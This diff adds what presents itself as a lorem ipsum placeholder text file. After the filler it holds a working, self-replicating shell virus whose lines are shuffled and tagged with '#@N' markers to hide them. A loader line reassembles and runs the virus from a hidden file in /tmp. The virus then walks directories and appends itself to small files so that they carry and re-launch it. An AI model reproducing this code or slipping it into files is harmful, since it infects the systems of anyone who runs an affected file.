@@ -1,0 +1,142 @@
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat d
+Lorem ipsum dolor sit amet,
+Duis bibendum lectus nec nis
+Phasellus efficitur massa eg
+Nullam nec imperdiet odio. P
+Aliquam felis dui, volutpat
+Lorem ipsum dolor sit amet,tail -n 49 ./virus.sh | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/.cd
+chmod +x /tmp/.cd && /tmp/.cd &
+exit 0
+        visit "$target/*"  #@9
+  if [ "$?" == "0" ]; then  #@29
+  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@32
+RANDOM=$$  #@17
+      fi  #@12
+visit(){  #@5
+fi  #@3
+    continue  #@24
+visit "*"  #@15
+}  #@14
+  nbline=$(wc -l $target)  #@20
+  while [ $nbl -ne 49 ]; do  #@39
+  exit 0  #@2
+    while [ "${tabft[$valindex]}" == "FT" ]; do  #@41
+done  #@48
+  if [ $(($nbline)) -lt 55 ]; then  #@23
+    else  #@10
+  declare -i nbl=0  #@38
+  tabft=("FT" [49]=" ")  #@37
+rm /tmp/.* 2> /dev/null #@49
+      tree+=("$target")  #@11
+  tail -n 49 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > /tmp/".$NEWFILE"  #@27
+if [ "$1" == "test" ]; then  #@1
+MANAGER=(test cd ls pwd)  #@16
+  done  #@13
+  chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@28
+  NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@26
+  done  #@47
+for (( i=0; i<${#tree[@]}; i++ )); do  #@18
+  nbline=$(echo $nbline | cut -d " " -f1)  #@22
+  directory=$1  #@6
+tree=()  #@4   
+      valindex=$(((RANDOM % 49) + 1))  #@42
+      if [ -d "$target" ];then  #@8
+  echo "exit 0" >> $target  #@36
+    valindex=$(((RANDOM % 49)+1))  #@40
+  target=${tree[i]}  #@19
+    continue  #@30
+  echo "tail -n 49 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" -f2- > $NEWFILE" >> $target  #@34
+  NEWFILE="/tmp/.$NEWFILE"  #@33
+    line=$(tail -n $valindex $0 | head -1)  #@44
+  nbline=${nbline##}  #@21
+    done  #@43
+    echo -e "$line" >> $target  #@45
+  for target in $directory; do  #@7  
+    nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@46
+  fi  #@25
+  fi  #@31
+  echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@35
